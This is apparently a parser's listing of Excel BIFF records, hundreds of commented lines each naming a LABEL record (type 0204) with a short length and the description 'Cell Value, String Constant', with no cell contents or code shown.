' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     10 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
